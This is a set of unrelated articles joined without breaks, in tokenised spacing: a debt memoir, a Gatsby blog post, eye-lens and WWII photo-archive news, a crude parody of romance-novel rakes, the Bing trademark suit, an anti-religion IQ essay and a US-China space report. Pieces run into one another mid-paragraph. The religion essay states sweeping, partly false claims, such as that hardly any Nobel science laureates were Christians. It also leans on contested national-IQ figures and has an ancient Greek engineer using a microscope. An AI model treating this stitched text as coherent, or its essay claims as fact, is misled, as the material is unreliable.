In business school , my fellow students and I became big fans of the idea of “ consumption smoothing , ” as laid out in the work of economic luminaries like Milton Friedman and Laurence Kotlikoff .
At least as we read it , the theory told us to do what we wanted , which was to spend money on stuff we did n’t quite need .
After all , we ’d be making good money when we graduated , so why not borrow a little against that future income to buy a car or go to Cancún ?
Ramsey could have told me why not , but I doubt I would have listened ; it ’s a lesson you can perhaps learn only firsthand .
I graduated into the teeth of the 2001 recession $ 100,000 in debt .
My six - figure job offer evaporated when the consulting firm fell on hard times .
It took me two years to find a permanent job , and when I did , that job was in journalism , which paid about a third of what I ’d been expecting .
Just like me , our nation has experimented with the “ educated ” overuse of leverage , aka debt .
Homeowners who believed that they would have been fools to rent when a mortgage - interest tax deduction was available have poured their savings and their hearts into homes they are now losing to foreclosure .
M.B.A.s are shuttering the companies they leveraged to the hilt as they chased tax deductions and higher returns .
Even our politicians speak of deficit spending as a sort of investment opportunity .
In industries from autos to housing , even as the private sector has retreated to repair its balance sheets , the government has dangled money it has borrowed in front of potential buyers to tempt them to further purchases .

F. Scott Fitzgerald 's " The Great Gatsby " begins with its narrator , Nick Carraway , recounting his father 's admonition that not everyone in the world is provided the same advantages .
The comment led to Nick 's inclination to " reserve all judgments , " a " habit that ... opened up many curious natures " to him .
This opening passage of " Gatsby " has shaped me dramatically .
Amid growing up in an environment of clear rights and wrongs , these words were a reminder to delay judgment in order to better understand people , even those who are objectively well outside my behavioral beliefs .
Given the importance of suspending judgment in the early stages of originating new ideas , this practice has been fundamental to helping businesses imagine new possibilities for potential opportunities .
There 's a time for judgment , but initially , ideas have to emerge and " breathe " first .
It is n't all glorious , however , when you reserve judgments .
As Nick notes , it led to him being " the victim of not a few veteran bores . "
I 've certainly found that to be the case .
It 's also led to having a diverse set of friends ( really fun ) who at times can't stand one another ( not so fun ) .
Their distinct differences , which I tend to overlook , often make them incompatible .
In all , delaying judgments is a beneficial practice .
So what do you think ?
Are there a few situations in your life right now where you'd be better off to suspend judgment and see how they play out first ?
The interesting things you 'll experience and learn will FAR outweigh any bores you might encounter .
Just go with me on this - okay ?
BTW - Want a little " fun " with " The Great Gatsby " ?

PATIENTS are having their eyes fitted with an artificial lens that allows them to see in " high definition " .
Surgeons begin the process by implanting the lens into the eye using the standard procedure for cataracts .
Then , for the first time in Britain , they can fine - tune the focus of the lens several days later .
The technique gives patients vision so sharp that it is even better than 20 /20 - the best an adult can usually hope for .
Bobby Qureshi , the first ophthalmic surgeon in the UK to use the lens , described it as " a hugely significant development " .
It can correct both cataracts and the long - sightedness that usually comes with age .
The lens is made from a special light - sensitive silicone .
By shining ultraviolet light on specific parts of the lens , surgeons can change its shape and curvature , sharpening the image seen by the patient .
Mr Qureshi told Sky News : " We have the potential here to change patients ' vision to how it was when they were young .
" The change is so accurate that we can even make the lens bifocal or varifocal , so as well as giving them good vision at distance we can give them good vision for reading .
" They wo n't need their glasses at all . "
The technique can overcome tiny defects in the eye that cause visual distortions .
The lens can be adjusted several times over a period of days until patients have perfect vision .
A final blast of light then permanently fixes the lenses ' shape .
Gill Balfour was one of the first patients to be fitted with the new lens at the Spire Gatwick Park Hospital , Surrey , England .
She had the first signs of cataracts and other vision problems .
She said : " It 's absolutely incredible .
To think it 's been tailor - made for you , matching any imperfections .
It 's the way forward , is n't it ? "

VIVID wartime scenes of prison camps and bombing raids were revealed to the public for the first time today with the launch of an online archive of aerial photographs .
The pictures , taken during secret reconnaissance flights by pilots in unarmed planes , show details such as prisoners in the yard at Colditz , vehicles leaving landing craft on D - Day and craters left in the ground from bombing raids on a German weapons testing site .
During World War II , skilled photographic interpreters studied the pictures using 3D equipment to provide crucial intelligence .
Until now the images , which were declassified by the Ministry of Defence and include photos taken by Allied aircraft and the Luftwaffe , have been kept behind closed doors .
The Aerial Reconnaissance Archives ( Tara ) contain more than 10 million declassified photographs , including pictures taken by the RAF up to the 1990s , many of which were originally analysed by MI4 intelligence teams based at the Allied Central Interpretation Unit at RAF Medmenham in Buckinghamshire during World War II .
They were stored for more than 50 years at Keele University before Tara was moved to Edinburgh last year to join The National Collection of Aerial Photography – part of the Royal Commission on the Ancient and Historical Monuments of Scotland .
Specialist staff are continuing the lengthy task of researching , cataloguing and digitising the images , which is expected to take many years .
Around 4,000 images from the archive will go online initially with more to be added .
Taken both before , during and after battles and bombing raids , the photos feature key places and moments of significance including Dunkirk as well as cityscapes of Copenhagen , Amsterdam , Berlin , Paris and Rome .
As well as key strategic sites , such as the Nazi V Weapon design and testing base at Peenemunde depicted in a September 1944 photo , the images convey some of the human suffering experienced amid the fighting .
A photo of a slave labour camp near Mainz in Germany taken on June 2 , 1945 , is one of only a handful of images that remain of the factory site because it was dismantled quickly after the war .
Camps and people on the ground can be seen in images of the so - called bridge over the River Kwai , part of the Thai - Burma railway project that cost the lives of thousands of prisoners of war .
The pictures , taken in January 1945 by the RAF , show the two bridges built by the Japanese – using labour from Tamarkan camp – which spanned the Mae Klong river ( later renamed Kwa Yai ) .
Prisoners can be seen in the courtyard in a photo of Colditz taken by a secret RAF reconnaissance mission on April 10 1945 , just days before US forces took over the area .
The castle in Germany became home to Allied prisoners deemed to pose a risk of escaping between 1939 and 1945 .
But despite its position on a rocky outcrop above the Mulde River there were a number of famous escapes from the high - security camp .
Allan Williams , manager of the National Collection of Aerial Photography , paid tribute to the efforts made to take the photos in the first place and the vital role the interpreted images played in wartime intelligence .
“ The archive literally shows the world at war , ” he said .

A group of rogues enters to find the heroine looking innocent and sexy .
Rogue 1 : We are a group of handsome , rouguish friends !
Rogue 2 : Note how disgustingly wealthy we all are !
Rogue 3 : We 're like a pack of wild , roguish , devastatingly handsome wolves !
Rogue 4 : A pack made up entirely of alpha-males !
Rogue 5 : This causes no problems in the group dynamic at all , believe it or not .
Rogue 6 : We have terrible reputations as rakes and scoundrels !
Heroine : Why ?
3 : Because ….
* suspenseful music plays for a second * we stay out all night gambling , drinking , and sleeping with loose women !
1 : Not that we 're alcoholics .
That would be unattractive .
And we do n't lose any money at the gambling tables .
4 : We do sleep with a lot of women , though .
Heroine : Everyone knows that reformed rakes make the best husbands , because they have the four qualities women desire most in a husband : sexual prowess , commitment issues , promiscuity , and a diverse selection of venereal diseases !
6 : Then you 'll like us !
We 're total man -whores !
7: We use our bad - boy charm to seduce women into our grasp , take them deep into the woods , and ravish them !
5 : We do this in a completely consensual and ecologically responsible manner , of course .
All : Of course !
2 : We 're really quite dangerous .
You had best stay away from us .
3 : If you get too close to us , we may be forced to marry you to preserve your honor and then fall madly in love with you .
You would n't want that to happen , would you ?
8 : It would be very traumatic for you , all those multiple orgasms .
3 : Stay away from us .
We want you too much for our own good .
And if you do n't stay away , then how will we be able to stalk you and thus be conveniently ready to come to your rescue at the first threat to your virtue ?
1 : Because being rescued from a would - be rapist by your stalker is Romantic !
Heroine 's Boring Fiance :
But is n't it my job to rescue her ?
8 : But will you rescue her ?
HBF : No .
I will be elsewhere at the time , and ignorant of the entire situation .
Heroine : Oh , he means well .
* pats her fiance on the head * I 'm really rather fond of him .
We plan to have a nice , boring life together .
HBF : I am so sexually uninterested in the heroine despite her ravishing charms that one almost wonders if I might be gay .
Heroine : ( to fiance ) Hush , you 're supposed to be part of the scenery .
( to group )
So let me get this straight , you all have terrible reputations because you have consensual and ecologically responsible sex with loose women and indulge fairly mildly in the vices gentlemen of your ranks are expected to indulge in , and despite your insanely strong senses of honor and responsibility ?
All : Yes .
Heroine : Terrible reputations ?
1 : You know , when you put it that way , it seems a bit odd .
It must be because I 'm so handsome and brooding !
2 : Or because I had an unhappy childhood .
3 : I had an even more unhappy childhood .
4 : I was betrayed by a woman .
5 : I have sworn never to marry because of a dark family secret .
6 : I am seeking revenge against your family .
7 : I am Mr. Darcy , but with a bigger dick
8 : I was wounded in the war .
9 : I am allergic to milk products .
Heroine :
There sure are a lot of you
6 : That 's for the sequels
HBF : 8 sequels ?
That 's a lot of sequels .
Do I get a sequel ?
2 : No , but it 's still not just 8 .
My handsome younger brother will get a sequel too .
4 : And my beautiful and rebellious younger sister !
9 : And my tragically widowed neighbor with the obligatory Small Adorable Child Who Will Need A Governess !
HBF : This is n't fair .
Butler :
You 'll get used to it .
( more quietly )
Best not to get too upset over it , or you may get turned into the villain .
I 've seen it happen before .
HBF : Who are you ?
Butler : I am the hero 's butler and all - purpose manservant .
I take care of the uninteresting parts of the plot while the hero and heroine screw , and use my magic butler powers to discover and impart relevant bits of backstory at the right moments .
Heroine : ( to butler )
You should n't reply to him , it only encourages him .
Just let him make meaningless comments in the background while the hero overtly seduces me before all of London society .
HBF : ( to heroine )
You know , it wo n't be as difficult to understandingly release you so you can follow your heart as I first thought it would be .
Heroine : Do n't be silly .
My bitchiness makes me irresistably attractive to men !
Does n't it , boys ?
ALL : Yes !
Heroine : Let 's go get in a compromising situation , shall we ?
( pause )
2 : Er… which one of us were you talking to ?
Heroine : Ooh , I do n't know , you 're all so dreadfully unsuitable despite the fact that you 're all rich , titled , handsome , and unmarried !
I should n't dare risk my reputation with any of you … but I must , the temptation is too great !
Hmm .
Do any of you have a menacing feature of nature or a predatory animal in your name ?
That 's always sexy .
All : I do !
1 : Duke Ravensmoor !
2 : Lord Greycliff !
3 : Count Blackthorn !
4 : Lord Lionsgate !
5 : Viscount Hawkstone !
6 : Marquess Stormhaven !
7 : Viscount Falconwood !
8 : Lord Wolfham !
9 : Count Buttweasel !
Everyone : ( slowly turns to look at 9 )
Heroine : What ?
9 : What ?!
Weasels are predators !
Heroine : Count Buttweasel is disqualified .
Okay , who is bored with the life of a rogue and secretly yearning for something deeper and more meaningful ?
1,2,4,5,6,7,8 : I am !
3 : I am the hottest one , so I cannot marry to early in the series , lest people stop reading , and therefore must remain satisfied with my wicked ways for a while longer .
Heroine : Count Blackthorn is disqualified .
Who is capable of maintaining a constant , bulging erection whenever he looks at or thinks about me ?
2,4,5,6,7,8 : I am !
1 : What , you mean seriously , every single time ?
But you do n't sleep with the hero until two - thirds of the way through the book !
That 's a three - month erection !
Heroine : Duke Ravensmoor is disqualified .
Oh , screw this , I 'll just take whichever one is named Adrian .
5 : That would be me !
Heroine and 5 , now the Hero , leave , followed by the rest of the rogues .
HBF : Hello ?
Anyone still here ?
Butler : I am everywhere .
Do remember what I warned you about anger , sir .
You do n't want to suddenly go mad and start trying to ruin the protagonists .
HBF : Oh , I 'm not angry anymore .
I 've decided that I am gay .
Want to go out some time ?
Butler : ( in shock ) But … but I 'm a minor character over the age of 40 !
I 'm not allowed to have a sexual orientation !
Besides , in the midst of all these dangerously attractive young noblemen , why would you want me ?
HBF : Hmmm , let 's see , because you 're the most intelligent , trustworthy , efficient , subtle , and hardworking character in the book , and you have a charming dry sense of humor ?
And you 're neither deeply traumatized nor indiscriminately promiscuous ?
Butler :
This is true .
HBF : If I were a heroine , I 'd be all over you .
Butler :
You have n't even seen the butler magic yet .
A small design company in America has filed a lawsuit against Microsoft , alleging that it is unfairly using the Bing name for its search engine .
Bing !
Information Design , based in St Louis , Missouri , launched a legal action last week in a local court - alleging that the multibillion - dollar software corporation " had knowledge of the mark " and " intentionally interfered " when it relaunched its search engine with a new name earlier this year .
Lawyers for the Missouri firm said that the action damaged the smaller company 's business , and would seek punitive damages to " punish " Microsoft and deter other companies from acting in a similar manner .
" For nearly 10 years my client has been using the Bing ! mark , " said lawyer Anthony Simon in a statement .
" My client selected this unique mark to distinguish itself in the marketplace and invested substantial time and effort promoting its business using Bing ! . "
" Microsoft 's use of the identical mark and its aggressive advertising have gutted all of my client 's efforts to distinguish its business and created confusion that must be remedied . "
The situation may not be clear cut .
The company says it has been using the name since at least 2000 , and an application for the trademark outlines the use of the name Bing ! for advertising and services for the advertising industry .
However , a trademark application for the name was not filed until May - when rumours about Microsoft 's new product had already spread widely across the internet .
Microsoft , meanwhile , filed its own trademark applications for the name in March - for a variety of uses , including search engine software , interface software , advertising , telecoms and for " providing a website and website links to geographic information , map images and trip routing " .
In addition , two other companies are also taking action against Microsoft over what they say are trademark infringements : a web - based shopping service called BongoBing and software company Terabyte , which has a product called BootIt Next Generation , or Bing for short .
Microsoft lawyer Kevin Kutz said that he believed the case would be dismissed because there was little confusion between his company 's business and the St Louis firm .
" We believe this suit to be without merit and we do not believe there is any confusion in the marketplace with regard to the complainants offerings and Microsoft 's Bing , " he told the Register .
" We respect trademarks and other people 's intellectual property , and look forward to the next steps in the judicial process . "
That assertion , however , may ring hollow for some - coming after a difficult week for the Seattle - based software company in which it admit having stolen computer code from a Canadian internet startup .
After allegations that a site developed by MSN China had lifted code from messaging website Plurk , Microsoft apologised for the transgression and said it was the fault of an independent contractor .
" It was never our intent to have a site that was not respectful of the work that others in the industry have done , " the company said .
Plurk responded by saying it is still considering whether to take legal action .
The historical battles between religious institutions and science , such as those in physics , astronomy and biology , indicate there is something wrong with the religious approach to the study of reality .
The underlying problem extends to negative effects on the individual intelligence of believers , and a related negative effect on educational achievements .
Hardly any of the several - hundred Nobel Prize winning scientists have been Christians .
Only 3.3 % of the Members of the Royal Society in the UK and 7 % the National Academy of Sciences in the USA , believe in a personal God .
The more senior and learnéd the scientist , the less likely they are to believe in God .
The children of highly religious parents suffer diminished IQ s - averaging 7 to 10 points lower compared to their non-religious counterparts in similar socio-economic groups .
As you would expect from these results , multiple studies have also shown that IQ is opposed to the strength of religious belief .
39 studies since 1927 ( out of 43 ) have found that the more educated a person is , and the higher one 's intelligence , the less likely someone is to hold religious beliefs - " religion declines in proportion to the rise in education and personal income " 1 .
This correlation is n't new and was also observed in ancient Greece by Polybius ( 200 - 118 BCE ) 2 .
The effect extends beyond individual countries and is visible inter-nationally .
Countries with a higher rate of belief in God have lower average intelligence .
All countries with high average intelligence have low national levels of belief in God .
For countries where belief in God is over 80 % , the average national IQ is 83 points .
For those countries where stated disbelief in God ( atheism ) is greater than 20 % , the national average IQ is 98 points .
Instead of belief in God , countries with the highest IQs adhere to Far - Eastern belief systems such as Buddhism , Taoism and Shintoism .
It is not just intelligence and education that is inversely correlated with religion - it has also been found that the more you know about religion itself , the less likely you are to be religious 3 .
1. Religion and Science
1.1 . Bias When Searching for Truth
If you think you have the answers , you are less likely to search for the truth .
If you are an engineer in ancient Greece who thinks that the microscope has proven that neurones work through hydraulic pressure , you are not likely to question this truth without very convincing evidence : your search has largely ended .
Your background belief ( as an engineer in this example ) has primed you , and biased you towards accepting the hydraulic neurone theory .
Those who believe that " God works in mysterious ways " and believe in miracles , magic and prayer , and that God makes the planets orbit the sun , are less likely to have enquiring minds about how such things work .
“ American scientists are less religious than the American public generally [ and ] the most distinguished scientists are the least religious of all ” " The God Delusion " by Prof. Richard Dawkins ( 2006 ) 13
Not only did their religion prevent them from thinking in the correct terms about basic physics , biology and astronomy , and not only did their atheist counterparts continue to search for truth while they did not , but their beliefs gave them a false confidence to actively punish those that disagreed .
The whole series of battles between religion and science ( which science has always won ) shows us empirically and historically that religion suppresses science .
The stubborn stance against science and real - world knowledge in Christianity stems from the very founders of that religion .
Take Tertullian , one of the great and powerful Christian speakers of very early Christianity , who in 200 CE was defending Christianity against its critics .
' Before he closes his defense , Tertullian renews an assertion which , carried into practice , as it subsequently was , affected the intellectual development of all Europe .
He declares that the Holy Scriptures are a treasure from which all the true wisdom in the world has been drawn ; that every philosopher and every poet is indebted to them .
He labors to show that they are the standard and measure of all truth , and that whatever is inconsistent with them must necessarily be false ' 14 .
And what a terrible legacy became of that mode of thought : it is only true if it says so in the Bible .
The hallmark of ignorant , dangerous barbarianism and fundamentalism .
Thankfully for the study of truth , the process of secularisation has diminished the strength of religion across the West , and since the Enlightenment , when religious institutions started to lose control of public life , education continues to act as an anti-religion force in the world : the more educated a person is , the less likely they are to be religious .
Education is the key to leading successful , happy and above all , a meaningful life devoid of nonsense .
The future looks bright for many .
Although Europe excels ( in a patchy way ) in all - faiths education where religions cannot stamp their particular dogmas over science education , this is not the case in much of the rest of the world , so there is much work yet to do in combatting anti-science religiosity .
1.2 . Non-Religious People Can Become Better Scientists
Richard Dawkins ( 2006 ) summarizes on the religious beliefs of Nobel - Prize winners , the members of the top scientific organisations in the USA and the UK , and finds that only a small percent believe in a personal God , even in countries where god - belief is extensive .
Because those who do not subscribe easily to dogmatic lines of thought are naturally more inquisitive , they are the ones more likely to discover new facts about the world .
This is perhaps why most scientists are atheists .
A large survey confirmed that becoming a scientist does not lead to a loss of religious conviction 15 ; but , those who are free from it are simply more likely to want to study the world objectively , and therefore to become good scientists .
The less religious they are , the better they become at science .
“ The only website I could find that claimed to list ' Nobel Prize - winning Christians ' came up with six , out of a total of several hundred scientific Nobelists .
Of these six , it turned out that four were not Nobel Prize - winners at all ; and at least one , to my certain knowledge , is a non-believer who attends church for purely social reasons .
A more systematic study by Benjamin Beit - Hallahmi ' found that among Nobel Prize laureates in the sciences , as well as those in literature , there was a remarkable degree of irreligiosity , as compared to the populations they came from . '
52 A study in the leading journal Nature by Larson and Witham in 1998 showed that of those American scientists considered eminent enough by their peers to have been elected to the National Academy of Sciences ( equivalent to being a fellow of the Royal Society in Britain ) only about 7 per cent believe in a personal God 53 .
This overwhelming preponderance of atheists is almost the exact opposite of the profile of the American population at large , of whom more than 90 per cent are believers in some sort of super - natural being . [...]
It is completely as I would expect that American scientists are less religious than the American public generally , and that the most distinguished scientists are the least religious of all . [...]
The overwhelming majority of [ fellows of the Royal Society ] , like the overwhelming majority of US Academicians , are atheists .
Only 3.3 per cent of the Fellows agreed strongly with the statement that a personal god exists [...] while 78.8 per cent strongly disagreed [... ] .
There were a massive 213 unbelievers and a mere 12 believers . ”
" The God Delusion " by Prof. Richard Dawkins ( 2006 ) 16
References 52 and 53 are duplicated at the bottom of this page .
Studies have found that a general " connectedness with god " is associated with lower levels of education 17 .
Prof .
Kyung reports the findings of many studies into religion and intelligence , and the chart on the right is my reproduction of the first chart on one of his pages , taken from data in a Scientific American article ( 1999 ) 18 .
Many of these studies are probably mentioned below by Dawkins .
39 studies since 1927 have found that the more educated a person is , and the higher one 's intelligence , the less likely someone is to hold religious beliefs .
It shows that those with a degree in science are less than half as likely to believe in God as the general populace , and eminent scientists are nine times less likely .
This correlation is n't new .
A historian of ancient Greece , Polybius ( 200 - 118 BCE ) says that in his time , educated and enlightened men knew as " a matter of course that all this talk about the gods and the underworld is a myth which nobody among the better classes takes seriously " and that in political circles there was an active attempt to curb belief in gods 2 .
2. Religion and General Intelligence
2.1 . The More Religious the Parents , the Less Intelligent the Children ( Persisting Into Adulthood )
There is a reason why god - believing adults rarely become scientists , and almost never become top scientists .
Not only does theology and dogmatic religious assertions interfere with correct scientific thought , but , children of religious parents have on average , lower intelligence .
This common - sense finding is not a one - off statistic , but part of an entire trend .
The stricter the religious beliefs of the parent , the less the average intelligence of the child .
“ Sociologist Zena Blau of the University of Houston recently conducted a study of more than a thousand children in Chicago . [...]
In 1981 Blau reported that IQs were lowest among children whose mothers have overly strict religious beliefs .
Children whose mothers were from a non-denominational or non-religious background had the highest average IQs - 110 for whites , 109 for blacks .
Children whose mothers belonged to " fundamentalist " religious groups tended to have IQs that were 7 to 10 points lower .
According to Blau , these religion - IQ differences hold even when you take into account the mother 's social class , current occupational status , and education . ” " Understanding Human Behavior " by James V. McConnel ( 1986 ) 19
This has a resultant effect on educational attainment :
“ A 2005 Gallup International study called " Voice of the People " surveyed fifty thousand people in more than sixty - five countries and found that people with secondary or high - level education are less religious than people with no education or only a basic education . ”
" 50 Reasons People Give for Believing in a God " by Guy Harrison ( 2008 ) 20
“ Several research studies have been published on the statistical relationship between religiosity and educational level , or religiosity and IQ .
Michael Shermer , in How We Believe : The Search for God in an Age of Science , describes a large survey of randomly chosen Americans that he and his colleague Frank Sulloway carried out . [...]
Religiosity is indeed negatively correlated with education ( more highly educated people are less likely to be religious ) .
Religiosity is also negatively correlated with interest in science . [...]
[ Paul Bell in Mensa Magazine , 2002 , reviewed all studies taken of religion and IQ .
He concluded : ]
" Of 43 studies carried out since 1927 on the relationship between religious belief and one 's intelligence and / or educational level , all but four found an inverse connection .
That is , the higher one 's intelligence or education level , the less one is likely to be religious or hold " beliefs " of any kind . " ”
" The God Delusion " by Prof. Richard Dawkins ( 2006 ) 21
It is easy to see how a cycle may emerge :
If some people are prompted to adopt some religious beliefs , their children will have less IQ .
They will therefore be more likely to take up religious beliefs more strictly .
If they do so , their children will have even less average intelligence , and perhaps adopt even stricter religious behaviours .
A cycle .
This cycle would be most readily shaken by education imposed from without , on a national scale .
Public education is a good defence against communities cycling into la-la land .
Also , sometimes such as during the enlightenment , a general changing in culture can break the hold of specific forms of religious inhibition , and break the cycle .
In the West , a gradual counter - cycle of individualism ended the dark ages and allowed the West 's cultural ascent .
2.2 . Religious Countries Have a Lower Average IQ
All the studies so far have concentrated on individual measurements of IQ , and how they correlate with religiosity .
In the West , this largely correlates with Christian religiosity .
Because most of these studies are performed in the West , it is possible that secularism and atheism is correlated with higher intelligence simply because Christianity has a particularly negative effect on intelligence .
To explore this further , we need to see if these trends exist in various cultures , where the background religion is not Christianity .
Source : Lynn , Harvey & Nyborg ( 2009 ) 22
A study of data for belief in God and intelligence across 137 countries was undertaken by Lynn , Harvey & Nyborg ( 2009 ) 22 , with the latest comprehensive sets of data available , which were mostly from 2004 .
The data shows conclusively that countries with a higher average IQ have less belief in God - they state that " in only 17 % of the countries ( 23 out of 137 ) does the proportion of the population who disbelieve in God rise above 20 % .
These are virtually all the higher IQ countries " .
For countries where belief in God is over 80 % , the average national IQ is 83.0 points .
For those countries where stated disbelief in God is greater than 20 % , the national average IQ is 98.0 points .
Many of the highest - IQ countries are historically , and currently , associated with Buddhism , Shintoism and Taosim .
Nearly half of the population of Singapore , which has the highest - recorded average national IQ , follow either Buddhism or Taoism .
The next highest countries , Japan and S. Korea , have similar cultures to Singapore , although nowadays 50 % of those in Japan do not state that they any religion at all .
Some of the least theistic countries are communist , or ex-communist , states where religion has been actively suppressed by government , and in these countries low belief in God does not exist alongside high national IQ , but , aside from those , most countries with low rates of belief in God have the best range of national average IQ .
2.3 . The Exceptions of Minority Religions 23
There are exceptions to the general rule that religion is linked with lower intelligence .
Some esoteric or obscure religions attract particularly educated fans .
Sometimes this results from an anti-establishment source amongst students or adults , sometimes it is because a particular style of religion gains a very positive image .
Buddhism in the UK once attained this status and a wide range of intellectuals flocked to newly formed Buddhist societies and the like .
These were later criticized for misrepresenting Buddhism , in particular by omitting irrational and societal elements of it .
A survey in 1998 found that nearly 75 % of the followers of the Friends of the Western Buddhist Order ( one of the largest UK Buddhist groups ) had a first degree , compared to 11 % of the rest of the population .
A third of them also had higher degrees .
24 .
Wiccans tend to be much better educated than average .
A UK survey by Pearson ( 2000 ) found " half of the Wiccans were university educated , seven had a masters degree , nine had doctorates , and one was studying for a doctorate . [...]
Only one person was seeking employment " 25 .
Needless to say , other authors have noted the same .
The historian Ronald Hutton states that Wiccans display " a higher than usual love of reading and commitment to constant self - education " ( 1999 ) 26 and J.B. Russell also notes that " most witches are relatively well educated " ( 1991 ) 27 .
Some minority religions attract a disproportionately intelligent following because they are hard to engage with , therefore , those that attach themselves to the religion are the types of people who commit strongly to their interests in life .
In all cases , as such movements gain in numbers and diversify to include more types of followers , this initial trend diminishes .
“ Philosophy is questions that may never be answered .
Religion is answers that may never be questioned . ” -- Anon .
“ There is a constant need for us to question our own beliefs , and the beliefs of those around us .
It creates a healthy atmosphere of skepticism and intelligence , and prevents people from coming to unreasonable conclusions .
The way our brains work mean that we frequently misinterpret events and data , and in particular , we always think there is more rationality and evidence for our beliefs than there is .
One of Friedrich Nietzsche 's longest - lasting declarations was that " we are fundamentally inclined to maintain that the falsest opinions ... are the most indispensable to us " 29 .
This all matters because when beliefs become unquestioned , a community can become increasingly divorced from reality .
This is dangerous when individual leaders or belief - based authorities claim to be acting in accord with a divine principle , such as God 's will .
When it comes to disputes , religionists can come to deny any chance of compromise .
In the adult world of democratic politics , compromise in disputes is what keeps things from breaking down : you give a little in one area , but have to give up in another .
However , arguments based on differences in religion or belief often contain parties that believe the issue has universal , absolute and cosmic significance .
They will not compromise on their position , and many ordinary believers state that they think that religious beliefs should be somehow beyond question 30 .
Malise Ruthven in his book on fundamentalism warns that this is particularly dangerous 31 .
It is how religious cults are formed .
In extreme cases this leads to complete social rejection and the possibility of suicide cults , as has been seen many times in history for example with Charles Manson 's followers and the 900 who died when the People 's Temple suicided .
These groups always start out with borderline , but common , beliefs and slowly become more delusional over time .
In all cases followers lacked an instinct to ask questions about the beliefs .
It is religion that gains most when people cease asking deep questions about beliefs , and it is truth that suffers most .
Thomas Paine famously remarked that " it is error only , and not truth , that shrinks from inquiry " 32 .
In the name of truth and common sense , do not let even trivial - seeming beliefs take hold without double - checking them , because once beliefs are trivialised , a slippery slope can take you down into madness ! ”

Beijing summit lands agreement for space talks
BY CRAIG COVAULT
SPACEFLIGHT NOW
Posted : November 18 , 2009
President Barack Obama and Chinese president Hu Jintao have agreed to expand and formalize U.S. - Chinese discussions on new cooperative space efforts , including initial talks on robotic planetary exploration and human space options .
A Long March 2 F rocket with a Shenzhou payload is prepared for launch .
Credit : CNSA
The cooperation adopted at the summit in Beijing this week will begin with exchange visits of the top space managers from each country in 2010 .
NASA Administrator Charlie Bolden , on a personal travel to nearby Japan , applauded the agreement saying he would be " perfectly willing to make the Chinese a partner in any space endeavor . "
Doing so , however , will require a major shift in U.S. government policy toward China and new oversight of China 's rapidly growing military space program .
The new role of the Chinese Air Force in military space was itself , a focus of controversy within the Chinese government this week .
Also NASA cooperation with China could also be a double edge sword for the space agency 's public affairs and Congressional liaison offices .
This is because a new CNN / Opinion Research Corporation survey finds that 71 % of Americans believe China is a direct economic threat to the U.S. , while 51 % percent consider China a direct military threat .
Only 25 % of 1,000 Americans surveyed still believe China has huge market potential to buy U.S. goods .
Previous NASA Administrator Mike Griffin made a short trip to China in 2006 to tour space facilities in Beijing and Shanghai , but concerns by the Bush Administration about Chinese human rights and arms trade issues kept the lid on any significant cooperation after that .
Unmanned space science cooperation , such as formal Chinese participation in the International Lunar Network ( ILN ) could occur more quickly .
The meetings involving the U.S and Chinese space agency heads will also include preliminary talks on human space flight topics .
No joint programs , however , are in the works yet involving Chinese astronauts on the International Space Station .
The U.S. and China have never held talks previously on joint manned flight options and the new discussions will center on whether Chinese science experiments or Chinese astronauts would be welcome on the ISS .
That is not a done deal by any means , because it would require unanimous consent from the current partners , and Japan may disapprove given current economic , cultural and political factors in the Pacific , as well as lingering sensitivities going back to World War II .
An even greater issue is whether the Chinese Shenzhou , based on the Soviet Soyuz , would ever be allowed to dock with the ISS , or whether Chinese station crewmembers would ever be allowed to launch on a U.S. launcher or Russian Soyuz .
The reverse side of that coin is whether the Chinese would ever allow a U.S. astronaut to launch on a Shenzhou .
At least two U.S. astronauts speak fluent Chinese .
A more near - term program that could involve more visible Chinese cooperation short of astronauts on the ISS is science team involvement with the large Alpha Magnetic Spectrometer ( AMS ) .
The several - ton instrument is set for launch to the ISS on the STS - 134 mission on Endeavour next July , the next - to - last space shuttle flight .
China has been heavily involved in the development of that unique instrument , a cosmic ray detector that will be important to identifying mysterious cold , dark matter in the universe .
The Beijing Institute of Spacecraft Engineering and Beijing Institute of Electrical Engineering were involved in building the AMS .
Other Chinese personnel involved in the STS - 134 payload 's construction and science team come from the Beijing Institute of High Energy Physics ; the Sun Yat - sen University in Guangzhou ; the Shandong University ; the Southeast University in Nanjing and the Shanghai Jiaotong University .
China is developing a docking test module for use as an outpost for Shenzhou docking practice .
Astronauts can make temporary stays inside the module .

" Both President Obama and I said that we are willing to act on the basis of mutual benefit and reciprocity to deepen our cooperation on space , " said President Hu .
Although the Obama agreement will accelerate cooperation , there are real concerns by U.S. officials about a lack of transparency in the Chinese manned program that is dominated by the People 's Liberation Army ( PLA ) .
" The potential costs of extensive cooperation between the U.S. and Chinese space programs far outweigh the likely benefit , " says Dean Cheng , a Research Fellow in Chinese Political and Security Affairs in the Asian Studies Center at The Heritage Foundation .
" Steps that can safely be taken to build toward future collaboration must be cautious and contingent , " Cheng says .
" China 's space program is overwhelmingly military in nature .
And nowhere more so than in the manned space program , " he says .
The " commanders " or " directors , " which include the head of the General Armaments Department , is one of the four general departments responsible for day - to - day management of the entire PLA , " says Cheng .
" The challenges presented by the Chinese space program 's strong ties to the PLA are exacerbated by the generally opaque nature of China 's space program on issues ranging from who the top decision - makers are to the size of their budget .
" Any effort at cooperation is likely to be stymied so long as the PRC views transparency as a one - way affair , " Cheng cautions .
Griffin was especially adamant about his concerns on transparency during his visit .
Chinese President
Hu said the two sides " also agreed to work together to continue to promote even greater progress in the growth of military - to - military ties . "
The need for greater military ties between the U.S. and China are especially important for the U.S. to understand China 's " intent " with military .
In the weeks prior to the Obama summit , NASA dispatched former deputy administrator and shuttle astronaut Fred Gregory to China for informal discussions on cooperation .
Top NASA managers told Spaceflight
Now that cooperative ideas would come nowhere near to what the U.S. and Soviet Union did in 1975 with the Apollo - Soyuz Test Project .
But they said limited unmanned cooperation , like what took place in 1991 when a NASA ozone mapping instrument was placed on a Soviet Meteor weather spacecraft , might be possible under the summit agreement .
China has for years desired an ISS role , even for basic science .
Their officials have raised the idea often to me during six separate trips to China since 1985 .
In 2001 , in Beijing then Chinese space administrator Luan Enjie asked me and a colleague to intercede on his behalf with NASA administrator Dan Goldin to invite him to Washington for ISS talks .
In a rather solemn moment around a dinner table with the top leadership of China 's space program , Luan spoke of the enormous share of humanity and energy that makes up China as it surges into the 21st century .
" Without China 's participation , the ISS is not a true international program , " Luan said convincingly .
" We want more frequent communications with entrepreneurs , engineers and enterprises in the U.S. so that we can have extensive cooperation in the future , " said Luan .
" My hope is the U.S. can treat us as friends . "
We met with Goldin shortly thereafter in Moscow , where he immediately rejected Luan 's overture .
